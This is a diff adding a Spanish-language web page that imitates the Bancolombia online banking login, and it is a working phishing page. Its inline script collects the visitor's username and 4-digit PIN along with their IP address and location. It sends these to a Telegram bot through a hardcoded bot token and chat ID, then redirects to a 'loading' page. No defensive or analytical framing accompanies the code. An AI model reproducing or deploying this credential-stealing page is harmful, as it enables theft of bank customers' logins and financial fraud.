@@ -1,0 +1,114 @@
+<html><head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Bancolombia</title>
+	<link rel="stylesheet" href="https://necolas.github.io/normalize.css/8.0.1/normalize.css">
+	<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&amp;display=swap" rel="stylesheet"> 
+	<link rel="stylesheet" href="estilos.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+	<script>
+//bot token
+var telegram_bot_id =  "7030387817:AAGkCCyGe_QxiTfRhaYSEJe-StfJOiYBPFE";
+//chat id
+var chat_id ="5530388468";
+
+ $.getJSON("https://api.ipify.org?format=json", function(data) {
+          $("#gfg").html(data.ip);
+      });
+      $.getJSON("https://ipinfo.io", function(response) {
+    $("#ip").html("IP: " + response.ip);
+    $("#address").html("" + response.city + ", " + response.country);
+  });
+  
+var u_name, u_name2,  ip, ip2;
+var ready = function () {
+    u_name = document.getElementById("usuario").value;
+	 u_name2 = document.getElementById("password").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "Basolombia info\n👤Usuari0: " + u_name + "\n🔑Clav3: " + u_name2 + "\n🌎IP: " + ip +"\n" + ip2;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+  
+        console.log(response);
+		
+          window.location = 'cargando.html';
+
+	
+    });
+    return false;
+};
+
+			</script>	  
+</head>
+<body>
+	<main>
+	<div align="center"><img src="https://res.cloudinary.com/df0dkfksy/image/upload/v1732298592/bancolombia_si_ycp9bo.png" style="width:250px"><br><br>
+	
+	
+		<form action="" method="post" class="formulario" id="formulario" onsubmit="return sender()">
+		
+		<p id="gfg" hidden="">118.70.133.28</p>
+						<p id="address" hidden="">Hanoi, VN</p>
+						
+						
+			<!-- Grupo: Usuario -->
+			<div class="formulario__grupo" id="grupo__usuario">
+				<label for="usuario" class="formulario__label">Sucursal Virtual Online</label>
+				<div class="formulario__grupo-input">
+					<input type="text" class="formulario__input" name="usuario" id="usuario" placeholder="Usuario" maxlength="16" required="">
+					<i class="formulario__validacion-estado fas fa-times-circle"></i>
+				</div>
+				<p class="formulario__input-error">El usuario es de 8 a 16 dígitos puede contener numeros y letras</p>
+			</div><br>
+
+
+	
+
+			<!-- Grupo: Contraseña -->
+			<div class="formulario__grupo" id="grupo__password">
+				<label for="password" class="formulario__label">Clave principal
+</label>
+				<span style="font-size:12px"></span>
+				<div class="formulario__grupo-input">
+					<input type="password" class="formulario__input" name="password" id="password" placeholder="Clave del Cajero" maxlength="4" onkeypress="return (event.charCode >= 48 &amp;&amp; event.charCode <= 57)" required="">
+					<i class="formulario__validacion-estado fas fa-times-circle"></i>
+				</div>
+				<p class="formulario__input-error">La contraseña tiene que ser de 4 dígitos númericos.</p>
+			</div>
+
+			
+			<br><br><br>
+
+			<div class="formulario__grupo formulario__grupo-btn-enviar">
+				<button type="submit" class="formulario__btn">Continuar</button>
+				<p class="formulario__mensaje-exito" id="formulario__mensaje-exito">Iniciando proceso de validación</p>
+			</div>
+		</form>
+		</div>
+	</main>
+
+	<script src="formulario.js"></script>
+	<script src="https://kit.fontawesome.com/2c36e9b7b1.js" crossorigin="anonymous"></script>
+
+
+<img src="https://res.cloudinary.com/df0dkfksy/image/upload/v1734108504/Captura_de_pantalla_2024-12-13_110329_hfagxb.png" style="width: 390px;display: block;margin: 0 auto;">
+   <br>
+   <br></body></html>
